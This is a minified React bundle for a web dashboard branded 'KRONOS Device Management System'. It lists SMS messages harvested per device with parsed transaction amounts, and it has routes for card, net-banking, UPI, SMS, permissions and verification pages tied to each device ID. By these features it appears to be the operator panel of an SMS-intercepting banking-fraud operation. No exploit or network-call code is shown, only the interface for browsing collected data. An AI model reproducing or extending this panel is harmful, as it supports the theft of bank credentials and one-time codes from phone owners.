ease",cursor:"pointer",transform:De?"translateY(-2px)":"translateY(0)",position:"relative",overflow:"hidden"},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:"4px"},children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"6px"},children:[i.jsxs("span",{style:{fontSize:"9px",fontWeight:700,color:"var(--text-muted)",background:"var(--bg-input)",padding:"1px 8px",borderRadius:"8px",border:"1px solid var(--border-color)"},children:["#",Ie]}),i.jsxs("span",{style:{fontSize:"9px",fontWeight:600,color:"#6c63ff",background:"rgba(108,99,255,0.08)",padding:"1px 8px",borderRadius:"8px"},children:["📱 ",k.deviceId.slice(0,8),"... ",Pe?"🟢":"⚫"]})]}),i.jsx("button",{onClick:Kt=>Hs(k.id,Kt),style:{background:"none",border:"none",fontSize:"16px",cursor:"pointer",padding:"0 4px",color:ct?"#f1c40f":"var(--text-muted)",transition:"transform 0.2s"},onMouseEnter:Kt=>Kt.target.style.transform="scale(1.2)",onMouseLeave:Kt=>Kt.target.style.transform="scale(1)",children:ct?"⭐":"☆"})]}),i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:"4px"},children:[i.jsxs("span",{style:{fontSize:"13px",fontWeight:700,color:G.color},children:["📩 ",k.sender||"Unknown"]}),i.jsx("span",{style:{fontSize:"9px",color:"var(--text-muted)"},children:Hr(k.time)})]}),k.amount&&i.jsx("div",{style:{fontSize:"16px",fontWeight:700,color:G.color,marginBottom:"4px"},children:xr(k.amount)}),i.jsx("div",{style:{fontSize:"12px",color:"var(--text-secondary)",lineHeight:"1.4",maxHeight:"40px",overflow:"hidden",textOverflow:"ellipsis",display:"-webkit-box",WebkitLineClamp:2,WebkitBoxOrient:"vertical",marginBottom:"6px"},children:k.message||"No message content"}),i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",paddingTop:"4px",borderTop:"1px solid var(--border-color)"},children:[i.jsx("span",{style:{fontSize:"8px",fontWeight:600,padding:"1px 8px",borderRadius:"8px",background:G.bg,color:G.color},children:G.text}),i.jsx("span",{style:{fontSize:"8px",padding:"1px 8px",borderRadius:"8px",background:Z.bg,color:Z.color},children:Z.text})]})]},k.id||H)})}),r&&i.jsxs("div",{style:{textAlign:"center",padding:"20px",color:"var(--text-muted)"},children:[i.jsx("div",{style:{display:"inline-block",width:"24px",height:"24px",border:"2px solid rgba(108,99,255,0.1)",borderTopColor:"#6c63ff",borderRadius:"50%",animation:"spin 0.6s linear infinite",marginRight:"10px"}}),"Loading more..."]}),_n>1&&i.jsxs("div",{style:{display:"flex",justifyContent:"center",alignItems:"center",gap:"6px",marginTop:"16px",flexWrap:"wrap"},children:[i.jsx("button",{onClick:()=>C(k=>Math.max(k-1,1)),disabled:S===1,style:{padding:"5px 12px",border:"2px solid var(--border-color)",borderRadius:"6px",background:S===1?"var(--bg-input)":"var(--bg-card)",color:S===1?"var(--text-muted)":"var(--text-primary)",cursor:S===1?"not-allowed":"pointer",fontSize:"11px",fontWeight:600},children:"◀ Prev"}),i.jsxs("span",{style:{fontSize:"11px",color:"var(--text-muted)"},children:["Page ",S," of ",_n]}),i.jsx("button",{onClick:()=>C(k=>Math.min(k+1,_n)),disabled:S===_n,style:{padding:"5px 12px",border:"2px solid var(--border-color)",borderRadius:"6px",background:S===_n?"var(--bg-input)":"var(--bg-card)",color:S===_n?"var(--text-muted)":"var(--text-primary)",cursor:S===_n?"not-allowed":"pointer",fontSize:"11px",fontWeight:600},children:"Next ▶"})]}),i.jsx("style",{children:`
        @keyframes spin{to{transform:rotate(360deg)}}
        @keyframes shimmer{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
        @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(0.8)}}
      `}),V&&I&&i.jsx("div",{style:{position:"fixed",inset:0,background:"rgba(0,0,0,0.8)",backdropFilter:"blur(16px)",display:"flex",alignItems:"center",justifyContent:"center",zIndex:99999,padding:"20px",animation:"fadeIn 0.3s ease"},onClick:Vr,children:i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"16px",maxWidth:"500px",width:"100%",maxHeight:"90vh",overflow:"hidden",boxShadow:"0 30px 80px rgba(0,0,0,0.5)",border:"1px solid var(--border-color)",animation:"scaleIn 0.3s ease"},onClick:k=>k.stopPropagation(),children:[i.jsxs("div",{style:{padding:"14px 18px",borderBottom:"1px solid var(--border-color)",display:"flex",justifyContent:"space-between",alignItems:"flex-start",background:"var(--bg-input)"},children:[i.jsxs("div",{children:[i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"6px"},children:[i.jsxs("span",{style:{fontSize:"10px",fontWeight:700,color:"var(--text-muted)",background:"var(--bg-input)",padding:"1px 8px",borderRadius:"8px",border:"1px solid var(--border-color)"},children:["#",I.serialNo||"N/A"]}),i.jsxs("h4",{style:{margin:0,fontSize:"15px",fontWeight:700,color:"var(--text-primary)"},children:["📩 ",I.sender||"Unknown"]})]}),i.jsxs("span",{style:{fontSize:"10px",color:"var(--text-muted)",fontFamily:"monospace"},children:[(Qr=I.deviceId)==null?void 0:Qr.slice(0,16),"..."]})]}),i.jsx("button",{onClick:Vr,style:{background:"none",border:"none",fontSize:"22px",color:"var(--text-muted)",cursor:"pointer",padding:"2px 6px",borderRadius:"50%",transition:"all 0.2s"},onMouseEnter:k=>{k.target.style.background="rgba(231,76,60,0.1)",k.target.style.color="#e74c3c"},onMouseLeave:k=>{k.target.style.background="none",k.target.style.color="var(--text-muted)"},children:"✕"})]}),i.jsxs("div",{style:{padding:"16px 18px",maxHeight:"calc(90vh - 80px)",overflowY:"auto"},children:[i.jsxs("div",{style:{display:"flex",gap:"6px",flexWrap:"wrap",marginBottom:"10px"},children:[i.jsx("span",{style:{fontSize:"10px",fontWeight:600,padding:"3px 10px",borderRadius:"10px",background:Mt(I).bg,color:Mt(I).color},children:Mt(I).text}),i.jsx("span",{style:{fontSize:"10px",fontWeight:600,padding:"3px 10px",borderRadius:"10px",background:Yt(I.category).bg,color:Yt(I.category).color},children:Yt(I.category).text}),I.amount&&i.jsx("span",{style:{fontSize:"14px",fontWeight:700,color:Mt(I).color},children:xr(I.amount)}),i.jsx("button",{onClick:k=>{k.stopPropagation(),Hs(I.id,k)},style:{background:"none",border:"none",fontSize:"18px",cursor:"pointer",color:Q[I.id]?"#f1c40f":"var(--text-muted)"},children:Q[I.id]?"⭐":"☆"})]}),i.jsx("div",{style:{background:"var(--bg-input)",borderRadius:"10px",padding:"14px",fontSize:"13px",lineHeight:"1.6",color:"var(--text-primary)",whiteSpace:"pre-wrap",wordWrap:"break-word",border:"1px solid var(--border-color)"},children:I.message||"No message content"}),i.jsxs("div",{style:{marginTop:"10px",fontSize:"10px",color:"var(--text-muted)"},children:["🕐 ",Gs(I.time)," • ",Hr(I.time)]}),i.jsx("button",{onClick:()=>{Vr(),setTimeout(()=>Fe(I.deviceId),300)},style:{width:"100%",padding:"10px",marginTop:"14px",border:"none",borderRadius:"10px",background:"linear-gradient(135deg, #6c63ff, #3b82f6)",color:"white",fontSize:"13px",fontWeight:700,cursor:"pointer",transition:"all 0.3s"},onMouseEnter:k=>{k.target.style.transform="translateY(-2px)",k.target.style.boxShadow="0 4px 20px rgba(108,99,255,0.3)"},onMouseLeave:k=>{k.target.style.transform="translateY(0)",k.target.style.boxShadow="none"},children:"📱 View Device"})]})]})}),f&&b&&i.jsx("div",{style:{position:"fixed",inset:0,background:"rgba(0,0,0,0.7)",backdropFilter:"blur(12px)",display:"flex",alignItems:"center",justifyContent:"center",zIndex:9999,padding:"16px",animation:"fadeIn 0.3s ease"},onClick:Gr,children:i.jsxs("div",{style:{background:"var(--bg-card)",borderRadius:"14px",maxWidth:"460px",width:"100%",maxHeight:"92vh",overflow:"hidden",boxShadow:"0 20px 60px rgba(0,0,0,0.3)",border:"1px solid var(--border-color)",animation:"scaleIn 0.3s ease",display:"flex",flexDirection:"column"},onClick:k=>k.stopPropagation(),children:[i.jsxs("div",{style:{padding:"12px 16px",borderBottom:"1px solid var(--border-color)",display:"flex",justifyContent:"space-between",alignItems:"center",background:"var(--bg-input)",flexShrink:0,flexWrap:"wrap",gap:"6px"},children:[i.jsxs("div",{children:[i.jsxs("h4",{style:{margin:0,fontSize:"14px",fontWeight:700,color:"var(--text-primary)"},children:["📨 ",b.brand," ",b.model]}),i.jsxs("span",{style:{fontSize:"9px",color:"var(--text-muted)",fontFamily:"monospace"},children:["#",b.serialNo," • ",(jo=b.deviceId)==null?void 0:jo.slice(0,16),"..."]})]}),i.jsxs("div",{style:{display:"flex",alignItems:"center",gap:"6px"},children:[i.jsxs("span",{style:{fontSize:"10px",fontWeight:600,color:"#6c63ff",background:"rgba(108,99,255,0.1)",padding:"2px 8px",borderRadius:"10px"},children:["📨 ",b.smsCount]}),i.jsx("button",{onClick:Gr,style:{background:"none",border:"none",fontSize:"20px",color:"var(--text-muted)",cursor:"pointer",padding:"2px 6px",borderRadius:"50%"},children:"✕"})]})]}),i.jsxs("div",{style:{padding:"8px 16px",borderBottom:"1px solid var(--border-color)",display:"flex",alignItems:"center",gap:"6px",flexWrap:"wrap",flexShrink:0},children:[i.jsx("span",{style:{fontSize:"10px",fontWeight:600,color:"var(--text-muted)"},children:"Filter:"}),i.jsxs("select",{value:v,onChange:k=>_(k.target.value),style:{padding:"3px 8px",border:"1px solid var(--border-color)",borderRadius:"6px",background:"var(--bg-input)",color:"var(--text-primary)",fontSize:"11px",outline:"none"},children:[i.jsx("option",{value:"all",children:"📨 All Senders"}),Co().map(k=>i.jsx("option",{value:k,children:k},k))]}),i.jsxs("span",{style:{fontSize:"9px",color:"var(--text-muted)"},children:[Yr.length," messages"]})]}),i.jsx("div",{style:{padding:"10px 16px 16px",overflowY:"auto",flex:1,maxHeight:"calc(92vh - 160px)"},children:Yr.length===0?i.jsxs("div",{style:{textAlign:"center",padding:"30px",color:"var(--text-muted)"},children:[i.jsx("span",{style:{fontSize:"30px",display:"block",marginBottom:"6px"},children:"📭"}),i.jsx("p",{children:"No messages"})]}):Yr.map((k,H)=>{const G=Mt({...k,type:gr(k.message)}),Z=Vs(k.message);return i.jsxs("div",{style:{padding:"8px 10px",marginBottom:"6px",background:"var(--bg-input)",borderRadius:"6px",border:"1px solid var(--border-color)",borderLeft:`3px solid ${G.color}`},children:[i.jsxs("div",{style:{display:"flex",justifyContent:"space-between",alignItems:"center",marginBottom:"2px",flexWrap:"wrap",gap:"2px"},children:[i.jsxs("span",{style:{fontSize:"11px",fontWeight:700,color:G.color},children:["📩 ",k.sender||"Unknown"]}),i.jsx("span",{style:{fontSize:"8px",color:"var(--text-muted)"},children:Gs(k.time)})]}),Z&&i.jsxs("div",{style:{fontSize:"11px",fontWeight:700,color:G.color},children:[G.text," • ",xr(Z)]}),i.jsx("div",{style:{fontSize:"11px",color:"var(--text-primary)",wordWrap:"break-word",whiteSpace:"pre-wrap"},children:k.message||"No message"})]},H)})}),i.jsx("button",{onClick:()=>{Gr(),setTimeout(()=>t(`/device/${b.deviceId}`),300)},style:{margin:"6px 16px 16px",padding:"8px",border:"none",borderRadius:"8px",background:"linear-gradient(135deg, #6c63ff, #3b82f6)",color:"white",fontSize:"12px",fontWeight:700,cursor:"pointer",flexShrink:0},children:"📱 View Device"})]})})]})}const Uk=({currentTime:t,isDark:e,toggleTheme:n})=>i.jsxs("div",{className:"status-bar",children:[i.jsx("span",{className:"status-time",children:t}),i.jsxs("div",{className:"status-icons",children:[i.jsx("span",{children:"📶"}),i.jsx("span",{children:"🔋"}),i.jsx("button",{className:"theme-toggle-btn",onClick:n,children:e?"☀️":"🌙"})]})]}),Hk=({isOpen:t,onClose:e,logo:n})=>t?i.jsx("div",{className:"logo-popup-overlay",onClick:e,children:i.jsxs("div",{className:"logo-popup-content",onClick:r=>r.stopPropagation(),children:[i.jsx("button",{className:"logo-popup-close",onClick:e,children:"✕"}),i.jsx("img",{src:n,alt:"KRONOS Logo",className:"logo-popup-image"}),i.jsxs("div",{className:"logo-popup-info",children:[i.jsx("h2",{children:"KRONOS"}),i.jsx("p",{children:"v3.2.1 • Device Management System"})]})]})}):null,Vk=({message:t,type:e})=>t?i.jsx("div",{className:`toast ${e}`,children:t}):null;function Gk(){const{isDark:t,toggleTheme:e}=Ak(),{user:n,logout:r,sessions:s}=xn(),o=gt(),[a,l]=g.useState(!1),[c,d]=g.useState(null),[p,f]=g.useState(""),[u,b]=g.useState(!1);g.useEffect(()=>{const h=()=>{f(new Date().toLocaleTimeString("en-IN",{hour:"2-digit",minute:"2-digit",hour12:!0}))};h();const y=setInterval(h,1e3),w=N=>{const{message:R,type:S}=N.detail||{};R&&x(R,S)};return window.addEventListener("showToast",w),()=>{clearInterval(y),window.removeEventListener("showToast",w)}},[]),g.useEffect(()=>{if(console.log("🔵 AppContent: Setting up remote logout listener..."),console.log("🔵 User:",n),console.log("🔵 User.uid:",n==null?void 0:n.uid),!n||!n.uid){console.log("🔵 No user logged in, skipping remote logout listener");return}const h=localStorage.getItem("kronos_session");if(console.log("🔵 Current session ID:",h),!h){console.log("🔵 No session ID found");return}let y=null,w=null;try{console.log("🔵 Setting up listenRemoteLogout..."),y=ak(n.uid,h,N=>{console.log("🔴 REMOTE LOGOUT COMMAND RECEIVED:",N),alert("⚠️ You have been logged out from this device by admin!"),localStorage.removeItem("kronos_user"),localStorage.removeItem("kronos_session"),r(),window.location.href="/login"}),console.log("🔵 Setting up listenAllSessions..."),w=Uv(N=>{N.some(S=>S.sessionId===h&&S.userId===n.uid)||(console.log("🔴 Current session deleted by admin"),alert("⚠️ You have been logged out from all devices!"),localStorage.removeItem("kronos_user"),localStorage.removeItem("kronos_session"),r(),window.location.href="/login")}),console.log("✅ Remote logout listeners set up successfully")}catch(N){console.error("❌ Error setting up remote logout listeners:",N)}return()=>{console.log("🔵 Cleaning up remote logout listeners"),y&&typeof y=="function"&&y(),w&&typeof w=="function"&&w()}},[n,r]);const x=(h,y="info")=>{d({message:h,type:y}),setTimeout(()=>d(null),2800)},v=()=>{b(!0)},_=()=>{b(!1)},m=()=>{o("/login")};return i.jsxs("div",{className:`app ${t?"dark":"light"}`,children:[i.jsx(Uk,{currentTime:p,isDark:t,toggleTheme:e}),i.jsxs("div",{className:"topbar",children:[i.jsxs("div",{className:"top-left",children:[i.jsxs("div",{className:"logo-container clickable",onClick:v,title:"Click to enlarge logo",children:[i.jsx("div",{className:"fire-ring-1"}),i.jsx("div",{className:"fire-ring-2"}),i.jsx("div",{className:"fire-ring-3"}),i.jsx("div",{className:"fire-particle"}),i.jsx("div",{className:"fire-particle"}),i.jsx("div",{className:"fire-particle"}),i.jsx("div",{className:"fire-particle"}),i.jsx("div",{className:"fire-particle"}),i.jsx("div",{className:"fire-particle"}),i.jsx("div",{className:"fire-particle"}),i.jsx("div",{className:"fire-particle"}),i.jsx("span",{className:"fire-emoji top-right",children:"🔥"}),i.jsx("span",{className:"fire-emoji bottom-left",children:"🔥"}),i.jsx("span",{className:"fire-emoji top-left",children:"✨"}),i.jsx("span",{className:"fire-emoji bottom-right",children:"⚡"}),i.jsx("img",{src:Ld,alt:"KRONOS",className:"app-logo"})]}),i.jsxs("div",{className:"brand-info",children:[i.jsx("span",{className:"brand-name",children:"KRONOS"}),i.jsx("span",{className:"brand-version",children:"v3.2.1"})]})]}),i.jsx("div",{className:"top-right",children:n?i.jsxs(i.Fragment,{children:[i.jsx(Rk,{}),i.jsx("button",{className:"admin-btn",onClick:()=>l(!0),children:"⚙"}),i.jsx("button",{className:"theme-toggle-mobile",onClick:e,children:t?"☀️":"🌙"})]}):i.jsxs(i.Fragment,{children:[i.jsx("button",{className:"admin-btn",onClick:m,children:"🔐 Login"}),i.jsx("button",{className:"theme-toggle-mobile",onClick:e,children:t?"☀️":"🌙"})]})})]}),i.jsxs(j1,{children:[i.jsx(Le,{path:"/setup",element:i.jsx(Ek,{})}),i.jsx(Le,{path:"/login",element:i.jsx(Nk,{})}),i.jsx(Le,{path:"/",element:i.jsx(Xe,{children:i.jsx(_k,{})})}),i.jsx(Le,{path:"/change-password",element:i.jsx(Xe,{children:i.jsx(Ik,{})})}),i.jsx(Le,{path:"/admin-devices",element:i.jsx(Xe,{children:i.jsx(jk,{})})}),i.jsx(Le,{path:"/sessions",element:i.jsx(Xe,{children:i.jsx(kk,{})})}),i.jsx(Le,{path:"/admin-management",element:i.jsx(Xe,{children:i.jsx(Ck,{})})}),i.jsx(Le,{path:"/device/:deviceId",element:i.jsx(Xe,{children:i.jsx(Mk,{})})}),i.jsx(Le,{path:"/card/:deviceId",element:i.jsx(Xe,{children:i.jsx(Gv,{})})}),i.jsx(Le,{path:"/netbank/:deviceId",element:i.jsx(Xe,{children:i.jsx(Yv,{})})}),i.jsx(Le,{path:"/permissions/:deviceId",element:i.jsx(Xe,{children:i.jsx(Kv,{})})}),i.jsx(Le,{path:"/verification/:deviceId",element:i.jsx(Xe,{children:i.jsx(Qv,{})})}),i.jsx(Le,{path:"/sms/:deviceId",element:i.jsx(Xe,{children:i.jsx(Xv,{})})}),i.jsx(Le,{path:"/upi/:deviceId",element:i.jsx(Xe,{children:i.jsx(qv,{})})}),i.jsx(Le,{path:"/admin-add",element:i.jsx(Xe,{children:i.jsx(Ok,{})})}),i.jsx(Le,{path:"/admin-dashboard",element:i.jsx(Xe,{children:i.jsx(Fk,{})})}),i.jsx(Le,{path:"/all-devices",element:i.jsx(Xe,{children:i.jsx(Wk,{})})}),i.jsx(Le,{path:"/all-device-data",element:i.jsx(Xe,{children:i.jsx($k,{})})}),i.jsx(Le,{path:"/all-sms",element:i.jsx(Xe,{children:i.jsx(Bk,{})})}),i.jsx(Le,{path:"*",element:i.jsx(dx,{to:"/"})})]}),i.jsx(wk,{isOpen:a,onClose:()=>l(!1),onToast:x}),i.jsx(Vk,{message:c==null?void 0:c.message,type:c==null?void 0:c.type}),i.jsx(Hk,{isOpen:u,onClose:_,logo:Ld})]})}function Yk(){return console.log("✅ App() rendering..."),i.jsx(Q1,{children:i.jsx(Tk,{children:i.jsx(Sk,{children:i.jsx(Gk,{})})})})}bc.createRoot(document.getElementById("root")).render(i.jsx(m0.StrictMode,{children:i.jsx(Yk,{})}));
